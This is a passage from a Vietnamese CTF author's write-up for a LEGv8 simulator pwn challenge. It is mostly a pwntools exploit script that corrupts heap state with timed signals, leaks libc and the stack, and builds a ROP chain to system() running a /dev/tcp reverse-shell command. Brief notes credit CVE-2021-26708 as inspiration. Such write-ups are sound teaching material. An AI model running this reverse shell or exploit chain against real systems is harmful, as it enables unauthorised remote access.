    c
    set *(long*)($binary_base+0x4fd0) = usleep
    brva 0x1a94
end

define f
    signal SIGALRM
    patch_usleep
    del br 2 3
end

c
'''
def GDB():
    if args.NOGDB: return
    return gdb.attach(p, gdbscript=gs)
    

# ((1)), malloc(0x380)
p.sendlineafter(b'How much memory do you want for your program?', str(0x380).encode())

p.recvuntil(b'[')
memoryVirtual = int(p.recvuntil(b',', drop=True), 16)
log.info(f'{hex(memoryVirtual) = }')
reg = [0]*31
assembly_code = ""

# ((1))
reg[1] = memoryVirtual
reg[2] = 0         # use to save `sim` pointer
reg[3] = 0x90      # = `memory` - `sim`
reg[4] = 0x421     # new chunksize of `sim`

assembly_code += """
LDUR X2, [X1, #-40]    // save value of `memory` in X2
SUB X2, X2, X3         // now X2 has value of `sim`

STUR X2, [X1, #-40]    // set sim->memory = sim
STUR X4, [X1, #-8]     // set chunksize of sim to 0x421
"""

# ((2))
reg[5] = (1 << 56) # very large value for memSize
assembly_code += """
STUR X5, [X1, #112]   // memSize = very large
STUR XZR, [X1, #120]  // memoryVirtual = NULL
"""

# ((3))
num_instruction_used_before_trigger = 15
reg[6] = 0x530 + num_instruction_used_before_trigger * 4   # 0x530 =  `instructionMemory` - `sim`
assembly_code += """
ADD X6, X6, X2       // X6 = PC when alarm_handler is triggered
STUR X5, [XZR, #96]  // instructionCount = very large, use XZR because now memoryVirtual = 0
"""

# ((4))
reg[7] = 0x420  # = `registers` - `sim`
assembly_code += """
ADD X7, X7, X2          // X7 is now sim->registers
STUR X7, [XZR, #144]    // save sim->registers to sim + 0x90
"""

# ((5))
'''
until now, we have used 6 * 3.3 (STUR) + 1 * 3.6 (LDUR) + 3 * 2.1 (R-type) = 29.7 seconds
we need f(n) = 120 - {29.7 + [(2.1 + 1.8 + 1.8) * n - 1.8]} in (1.8, 1.8+1.5) // here 1.8 and 1.8+1.5 is the start and end time of usleep in `memoryAccess` in a STUR instruction
<=> n in (15.57, 15.84)
let's take n = 15, f(15) = 6.6 seconds remaining, we need it to be in (1.8, 3.3), preferably in the middle = 2.55
So we need to take away more 4.05 seconds. If we use 2 ORR, we have 6.6 - 2 * 2.1 = 2.4 seconds remaining, good enough

'''
n = 15
reg[8] = 1
reg[9] = reg[8] * n
assembly_code += """
LOOP:
    SUB X9, X9, X8
    CBZ X9, END
    CBZ XZR, LOOP
END:
    ORR XZR, XZR, XZR
    ORR XZR, XZR, XZR
"""

# ((6)), trigger
assembly_code += """
STUR X6, [XZR, #8]  // sim->pc = heap address of current instruction
"""

# ((7))
assembly_code += """
STUR X4, [X2, #168]  // now we have libc address @ sim + 152
"""

# ((8))
assembly_code += """
STUR X2, [X2, #16]
ORR X2, X20, X20
"""

# ((9))
reg[10] = 0  # used to store libc base
reg[11] = 0x203b30  #  = libc leak - libc base
assembly_code += """
LDUR X10, [X2, #152]
SUB X10, X10, X11  // now X10 has libc base
"""

# ((10))
reg[12] = 0x20ad58  # = &environ - libc base
reg[13] = 0x138     # = environ - main's rbp
reg[14] = 0         # to store main's rbp
assembly_code += """
ADD X12, X12, X10
LDUR X14, [X12, #0]
SUB X14, X14, X13  // now X14 has main's rbp
"""

# ((11))
reg[15] = pop_rdi = 0x10f75b
reg[16] = system = 0x58750
reg[17] = ret = 0x2882f
assembly_code += """
ADD X15, X15, X10
ADD X16, X16, X10
ADD X17, X17, X10
"""

# ((12))
cmd_start_register = 20
ip = '127.0.0.1'
port = 8080
cmd = f'bash -c "sh -i >& /dev/tcp/{ip}/{port} 0>&1"'.encode()
print(cmd)
j = cmd_start_register
for i in range(0, len(cmd), 8):
    reg[j] = u64(cmd[i:i+8].ljust(8, b'\0'))
    j += 1

reg[18] = 0x420 + cmd_start_register * 8  # offset from 'sim' to start of our command
assembly_code += """
STUR X15, [X14, #8]    // pop rdi
ADD X18, X18, X2
STUR X18, [X14, #16]   // command 
STUR X17, [X14, #24]   // ret
STUR X16, [X14, #32]   // system
"""

# ((13))
assembly_code += """
STUR XZR, [X2, #96]   // sim->instructionCount = 0, main function return
"""

print("--- Assembling Final Valid Code ---")
assembler = LegV8Assembler()

p.sendlineafter(b'Do you want to set initial values for registers?', b'y')
for i in range(31):
    p.sendlineafter(b'=', str(reg[i]).encode())

try:
    binary_code_bytes = assembler.assemble_bytes(assembly_code)
except ValueError as e:
    print(f"Assembly Failed: {e}")

p.sendlineafter(b'Enter your program', binary_code_bytes)
p.interactive()
```


### Cảm hứng
Bài này chủ yếu mình lấy ý tưởng bug `out-of-date local variable` của [writeup này]( https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html) cho CVE-2021-26708 trong kernel.

Mình không muốn ra đề kernel chủ yếu là do mình còn yếu phần đó, lý do khác là muốn mọi người đều có thể tiếp cận làm được.

Việc phải canh sao cho signal rơi vào đúng vị trí mong muốn, mình thấy tính chất của nó cũng khá giống race condition, nhưng nó sẽ reliable hơn, phù hợp với những bài userspace như vầy. 

## Thanks for playing
- Note 4/8: Nếu bài `LEGv81` bị 0 solve cũng không có gì bất ngờ. Mình đã chuẩn bị tinh thần :v 
